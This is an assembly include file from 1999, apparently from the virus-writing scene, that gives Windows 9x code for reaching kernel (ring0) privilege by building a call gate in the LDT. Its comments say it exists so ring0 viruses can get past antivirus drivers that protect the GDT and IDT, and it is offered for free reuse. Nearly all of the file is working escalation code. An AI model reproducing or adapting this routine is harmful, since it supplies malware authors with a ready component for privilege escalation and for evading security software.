
; ---------------------------------------------------------------------------

; CALLGATE.INC                                                    /for Win9X/
; programmed by Z0MBiE, http://z0mbie.cjb.net

; release 1.01/29-IX-99

; This file allows you to enter ring0 via callgate building in the LDT.
; It will work even if GDT/IDT pages are write-protected.
;
; Why LDT is better than GDT/IDT ?
; 'coz noone is protecting LDT. Yet. :-(

; ...YOU ARE FREE TO USE THIS SOURCE/BINARY IN ANY PURPOSES IN ANY FORM...

; This file was written at the same day,when friend said me that some av vxds
; alredy can protect idt/gdt pages.
; So r0-viruses with old good idt residency will suck...

; ---------------------------------------------------------------------------

; subroutine:           call_in_ring0
; input registers:      ESI=offset of your FAR subroutine (i.e. RETF at end)
; registers modified:   flags (DF=0)
;
; action:
;  - call your code in ring0
;  - all registers except flags are passed to your procedure
; features:
;  - ~60 bytes of code
;  - GDT/IDT may be write-protected, for example by AV VxDs
; main idea:
;  - create callgate in the LDT
; bugs:
;  - callgate is leaved in the LDT when exiting
; unhandled situations:
;  - if GDT is read-protected
;  - if LDT is write-protected
;  - if SLDT returns 0

; ---------------------------------------------------------------------------

CGS                     equ     8               ; CallGate Selector

call_in_ring0:          pushad

                        push    ebx             ; EBX <-- GDT.base
                        sgdt    [esp-2]
                        pop     ebx

                        xor     eax, eax        ; EAX <-- LDT selector
                        sldt    ax
                        and     al, not (111b)  ; selector --> index*8

                        add     ebx, eax        ; EBX <-- LDT descriptor offs

                        mov     ch, [ebx+7]     ; ECX <-- LDT.base
                        mov     cl, [ebx+4]
                        shl     ecx, 16
                        mov     cx, [ebx+2]

                        lea     edi, [ecx+CGS]  ; EDI <-- CG descriptor offs
                        cld

                        mov     eax, esi        ; build CallGate
                        stosw
                        mov     eax, 1110110000000000b shl 16 + 28h
                        stosd
                        shld    eax, esi, 16
                        stosw

                        popad

                        db      09Ah            ; call 28:<esi>
                        dd      0               ; unused, any number
                        dw      CGS+100b+11b    ; LDT+R3

                        ret                     ; well done

; ---------------------------------------------------------------------------
